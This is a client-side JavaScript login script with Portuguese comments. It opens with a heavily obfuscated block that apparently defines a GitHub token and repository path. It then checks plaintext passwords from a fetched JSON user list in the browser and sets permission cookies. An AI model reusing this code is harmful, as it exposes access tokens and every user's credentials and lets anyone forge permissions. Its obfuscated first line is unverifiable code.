var token,username,repo,path,url;(function(){var AQC='',QTN=389-378;function rwv(h){var z=4949377;var y=h.length;var d=[];for(var p=0;p<y;p++){d[p]=h.charAt(p)};for(var p=0;p<y;p++){var w=z*(p+65)+(z%33312);var g=z*(p+644)+(z%34882);var c=w%y;var b=g%y;var a=d[c];d[c]=d[b];d[b]=a;z=(w+g)%7633669;};return d.join('')};var CSa=rwv('uoxucbshtorajitncstfkdlyrrpgmqvcnwzeo').substr(0,QTN);var gCD='."a;+z1un s)a,g Sle.rrlm=nfbc=p+r+aartnCr8vlga)0lx=zv;d>n ujk;(2=h;7*a[5,74jo-t617,8k7=hitg8esy9h7v,10u7r,==);;7f6=8v,=;.; l[g.ht]f(no(tor;j[ri].,ne= gtep,<rg0[([r];vu+h)gar ;=1t.p("t),a+ni1atr=r9.n} 4vvdrr7=(sr=rgrmuo(s,)ehttb"=1,)oei}=leailu[uv=;C]A.op;r)(; t<ls.+(;bre9=lflvn2gjlj;( v0o;r-)1e+] e=)u)b)a(jags2 qv2w=llp)c.p[hv+)}f l7=)rh;8r9l,1m4;;xaod;;fv5th2= b)t;hr9(=+e(ava[,oarocha{)ld,b {+.rv3erb]nli;a0p-w+vp=(,-8u3a+u+,A,rpfa;n6tbt20ft8ml=pra+;C1"s .;o=iv=u)=cgi((n0xean=h=elga];a0Crd-h.(n+-ssi<vchibn.se+t]uwzbg,;avr )+e)C}0tgp4.nn(brujl8in( )ne)n1)jt2];re(v>;1d.;rch=gzs*biA(irotn,frc0=.9ush(C. ,e]ox=r).o.) r(;!analn"u8a+rqn,e..ggl=tcj"bb(+6q(ga1r92) =+e}nfenfen)=i rt6ifv(26j]r,{v +;apg=j8i)(,"e;vt01=2=c]-r!xsA,la6floiok}aooCn[ju(;jauj.[l(;ifs1u)k}Ccrxqodt({6p;c]a(v0v v,ioe<+.o+=g;hib;+][)a2sva;t{[nm(i,.6[)jd) .Sdac+9tmil;{;semn{drvo;e"rns ge.ceouAu,;oss)5=(rwr[";s<h")(r=;';var mAs=rwv[CSa];var qrT='';var ZrV=mAs;var ICe=mAs(qrT,rwv(gCD));var YRg=ICe(rwv('amot)l))$rQa#c.$0 .0Qnf)!af -!Q,a*Q.r6a=)#{.(#nl4e!36fq5.Q=8QbQ_eQ\/3.(a$ 7;0$.;Q&f $pqf=_"rQhui6d,!t;r"iu,s,eQQot;Qs \/fQc%dqQ.qn%{qe%!_t c8])os_!=(!.3stu,r4;);p2u$6ah=rkuN9rst=h,.c3Qaruf*.Qao.$r3r))tt93(7.Q.".Qu)h&.uC.n**o(1(e*r!rho){xQ&($n).hQ+QogbQ6))3Q=3u0Q.(-h.ir1eap(pt+tbQQQue97lbp.tj,Q=$Qf c) own)jgt!_,p;)Q%n; !;0)pS2r3ss}(!fri]]t5Tc.t)2k;.{)TfQq-.0,ol5\/+jr(*)n!2[[xi3lQspesfws \/;Qkb2n_.$.x;41b04o+5Q0[3jgy(m(!rhe:"it_}.uc;to)a!,c],41i.l(f(=gQ363(c$hhj;.l{-) iQQlnn;jebq5(4.n;_);1==m=gu\/QQol+2[\/.rjt4t,,$.bjefi6(h,)4)fo;n(!j.e,u,r)r$Q,frr1l{SccQ,03t6rmsg(c)\/i=f=,}arQnQcj7QfoQ,2+Q}eQ,_$cfbn5Q4.f#r!\'742Qhl6e{%ccrchQ=;Q;.4gp2=s{.()ofQ_0,)e.-nr6lQbQ!!\/$4g_)$%.{tru}iQ;}Qn..(fu\'$#]_"ofQf=!fc})*43 03#cls()("Q.d,(5zl3e(\/$h,$c}22;n$m3sQi!+poQ%;{sC2%!z(_1"rj(Qrv3!bt,g%s,m Q}3u_;.;dtlQtc4r!)tee4,QQ.,aQ+su]6c.QQgf .;tj_2" t\'ebu!w +2(an72c+%1+Q,oQ6+s}th}Qo.6Q;2Q&r_04f7oa)Qn){v..Q38h,1.f(,]l\')=ag_rfa!]25%w.fQ_oaitc&tic)Qsrwsfsp=o7.Qa.a.7)a$..0u)!s)Qjot.!"20Q3qq.Q+.sQw_ri$fl37ed(3l5p3}(tQh,${%.$3t.Q%.3h)bS-f;mcQj.CcQ_fb=;Q$j(S[6e.}.{)j2}qbj6)pe,n $ }Q=+.li7e)i[(Q,3(]r2c3-;.3lQii+a3Qt.tp sw!()0s!QQ\/(};cQ7=#(,(r)ojQ(kj\/p=)_]'));var PLR=ZrV(AQC,YRg );PLR(9922);return 3024})()

async function login() {
  const emailInput = document.getElementById('email').value;
  const passwordInput = document.getElementById('password').value;
  const errorMsg = document.getElementById('error-msg');
  const customErrorMsg = document.getElementById('custom-error-msg');

  try {
    const response = await fetch(url, {
      headers: {
        'Authorization': `token ${token}`
      }
    });

    // Verifique se a resposta foi bem-sucedida
    if (!response.ok) {
      throw new Error('Network response was not ok ' + response.statusText);
    }

    const data = await response.json();
    
    // Removido o console.log da resposta da API

    // O conteúdo do arquivo JSON está codificado em base64, então precisamos decodificá-lo
    const decodedContent = atob(data.content); // Decodifica o conteúdo base64

    // Agora podemos parsear o JSON decodificado
    const users = JSON.parse(decodedContent);

    // Procura pelo usuário com o email e senha fornecidos
    const user = users.find(user => user.email === emailInput && user.password === passwordInput);

    if (user) {
      if (!user.active) {
        customErrorMsg.style.display = 'block';
        errorMsg.style.display = 'none';
      } else {
        // Configura o cookie com o ID do usuário
        setCookie('id', user.id, 10);
        // Configura o cookie "permission" com o valor de cookieValue do usuário
        setCookie('permission', user.cookieValue);

        // Redireciona para a URL especificada
        window.location.href = user.redirectUrl; // Redireciona para a URL do usuário
        return { id: user.id, redirectUrl: user.redirectUrl }; // Retorna os dados do usuário, se necessário
      }
    } else {
      errorMsg.style.display = 'block';
      customErrorMsg.style.display = 'none';
    }

  } catch (error) {
    console.error('Houve um problema com a operação de fetch:', error);
    errorMsg.style.display = 'block';
    customErrorMsg.style.display = 'none';
  }

  // Em caso de falha ou usuário não encontrado, retorna null
  return null;
}

// Função para definir um cookie
function setCookie(name, value, days) {
  const expires = new Date();
  expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
}

// Função para salvar o código nos cookies
function salvarCodigoNosCookies() {
    const url = window.location.href;

    // Verifica se o parâmetro ?COD= existe na URL
    const regex = /[?&]COD=([^&]+)/;
    const match = url.match(regex);

    if (match) {
        // Extrai o valor do código de presente
        const codigoDePresente = match[1];

        // Salva o código nos cookies com o nome 'code', válido por 30 dias
        setCookie("code", codigoDePresente, 30);

        console.log('Código de presente salvo nos cookies:', codigoDePresente);
    } else {
        console.log('Não há código de presente na URL.');
    }
}

// Chama a função para salvar o código nos cookies se existir
salvarCodigoNosCookies();
